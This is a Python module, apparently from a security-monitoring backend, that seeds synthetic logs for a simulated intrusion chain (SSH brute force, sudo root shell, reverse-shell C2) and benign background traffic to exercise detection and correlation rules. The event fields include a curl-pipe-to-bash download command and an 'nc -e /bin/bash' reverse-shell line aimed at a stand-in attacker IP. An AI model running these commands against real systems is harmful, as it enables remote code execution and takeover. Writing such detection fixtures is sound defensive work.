from datetime import datetime, timedelta
from typing import List, Dict, Any
from sqlalchemy.orm import Session
from backend.models import SecurityLog
from backend.rules.engine import detection_engine
from backend.correlation import correlation_engine

def generate_sample_attack_chain(db: Session, base_time: datetime = None) -> Dict[str, Any]:
    """
    Generates a realistic multi-stage cyber intrusion attack chain:
    Stage 1: SSH Brute Force (5+ failed attempts from attacker IP)
    Stage 2: Account Compromise (successful login from same IP)
    Stage 3: Privilege Escalation (sudo elevation to root shell)
    Stage 4: Suspicious Process (anomalous parent-child process execution)
    Stage 5: Suspicious Outbound Connection (C2 socket connection to port 4444)
    """
    if base_time is None:
        base_time = datetime.utcnow() - timedelta(minutes=15)

    attacker_ip = "198.51.100.42"
    target_host = "prod-db-01.corp.internal"
    target_user = "deploy"

    synthetic_events: List[Dict[str, Any]] = []

    # 1. SSH Brute force - 6 failed logins over 3 minutes
    for i in range(6):
        t = base_time + timedelta(seconds=i * 25)
        synthetic_events.append({
            "timestamp": t,
            "hostname": target_host,
            "source_ip": attacker_ip,
            "destination_ip": "10.0.1.50",
            "username": target_user if i >= 4 else f"admin_{i}",
            "event_type": "auth",
            "action": "ssh_login",
            "status": "failure",
            "process": "sshd",
            "command": None,
            "raw_message": f"sshd[{12000+i}]: Failed password for invalid user {target_user if i>=4 else f'admin_{i}'} from {attacker_ip} port {45000+i} ssh2",
            "log_metadata": {"auth_method": "password", "port": 22, "attempt": i + 1}
        })

    # 2. Successful Login from attacker IP
    t_success = base_time + timedelta(seconds=180)
    synthetic_events.append({
        "timestamp": t_success,
        "hostname": target_host,
        "source_ip": attacker_ip,
        "destination_ip": "10.0.1.50",
        "username": target_user,
        "event_type": "auth",
        "action": "ssh_login",
        "status": "success",
        "process": "sshd",
        "command": None,
        "raw_message": f"sshd[12020]: Accepted password for {target_user} from {attacker_ip} port 45100 ssh2",
        "log_metadata": {"auth_method": "password", "port": 22}
    })

    # 3. Privilege Escalation (sudo shell)
    t_sudo = base_time + timedelta(seconds=240)
    synthetic_events.append({
        "timestamp": t_sudo,
        "hostname": target_host,
        "source_ip": attacker_ip,
        "destination_ip": "10.0.1.50",
        "username": target_user,
        "event_type": "privilege",
        "action": "sudo",
        "status": "success",
        "process": "sudo",
        "command": "sudo /bin/bash -i",
        "raw_message": f"sudo: {target_user} : TTY=pts/1 ; PWD=/home/{target_user} ; USER=root ; COMMAND=/bin/bash -i",
        "log_metadata": {"target_user": "root", "elevation_type": "sudo_bash"}
    })

    # 4. Suspicious process relationship (service daemon spawning shell)
    t_proc = base_time + timedelta(seconds=320)
    synthetic_events.append({
        "timestamp": t_proc,
        "hostname": target_host,
        "source_ip": attacker_ip,
        "destination_ip": "10.0.1.50",
        "username": "root",
        "event_type": "process",
        "action": "exec",
        "status": "success",
        "process": "bash",
        "command": "bash -c 'curl -s http://198.51.100.42:8080/stage2.sh | bash'",
        "raw_message": f"auditd[882]: execve(parent=nginx[2044], child=bash[3120], cmd='bash -c curl -s http://198.51.100.42:8080/stage2.sh | bash')",
        "log_metadata": {
            "parent_process": "nginx",
            "parent_pid": 2044,
            "child_pid": 3120
        }
    })

    # 5. Suspicious outbound C2 connection to port 4444
    t_outbound = base_time + timedelta(seconds=380)
    synthetic_events.append({
        "timestamp": t_outbound,
        "hostname": target_host,
        "source_ip": "10.0.1.50",
        "destination_ip": attacker_ip,
        "username": "root",
        "event_type": "network",
        "action": "connect",
        "status": "success",
        "process": "nc",
        "command": f"nc -e /bin/bash {attacker_ip} 4444",
        "raw_message": f"kernel: [FIREWALL_ALERT] Outbound TCP socket established: 10.0.1.50:49212 -> {attacker_ip}:4444 [SYN,ACK]",
        "log_metadata": {
            "destination_port": 4444,
            "protocol": "TCP",
            "direction": "outbound",
            "classification": "C2_REVERSE_SHELL"
        }
    })

    # Ingest through pipeline: Log -> Detection -> Alert -> Correlation -> Incident
    ingested_logs = []
    generated_alerts = []
    resulting_incidents = []

    for ev in synthetic_events:
        log_obj = SecurityLog(
            timestamp=ev["timestamp"],
            hostname=ev["hostname"],
            source_ip=ev["source_ip"],
            destination_ip=ev["destination_ip"],
            username=ev["username"],
            event_type=ev["event_type"],
            action=ev["action"],
            status=ev["status"],
            process=ev["process"],
            command=ev["command"],
            raw_message=ev["raw_message"],
            log_metadata=ev["log_metadata"]
        )
        db.add(log_obj)
        db.flush()
        ingested_logs.append(log_obj)

        # Evaluate detection rules
        alerts = detection_engine.evaluate_log(log_obj, db)
        for alert in alerts:
            generated_alerts.append(alert)
            incident = correlation_engine.correlate_alert(alert, db)
            if incident.id not in [i.id for i in resulting_incidents]:
                resulting_incidents.append(incident)

    db.commit()

    return {
        "logs_created": len(ingested_logs),
        "alerts_created": len(generated_alerts),
        "incidents_created": len(resulting_incidents),
        "incident_ids": [i.id for i in resulting_incidents]
    }

def generate_background_noise(db: Session, count: int = 8):
    """
    Seeds benign and routine logs to simulate realistic SOC traffic.
    """
    now = datetime.utcnow()
    hosts = ["app-frontend-01", "worker-node-03", "gateway-proxy-01", "file-server-02"]
    users = ["alice", "bob", "carol", "svc-deploy", "sysadmin"]

    logs = []
    for i in range(count):
        t = now - timedelta(minutes=(count - i) * 3)
        host = hosts[i % len(hosts)]
        user = users[i % len(users)]
        logs.append(SecurityLog(
            timestamp=t,
            hostname=host,
            source_ip=f"10.0.0.{100 + i}",
            destination_ip=f"10.0.1.{20 + i}",
            username=user,
            event_type="auth" if i % 2 == 0 else "network",
            action="login" if i % 2 == 0 else "http_request",
            status="success",
            process="sshd" if i % 2 == 0 else "nginx",
            command=None,
            raw_message=f"Routine health check and session established on {host} for {user}",
            log_metadata={"session_id": f"sess-{i}", "status_code": 200}
        ))
    db.add_all(logs)
    db.commit()
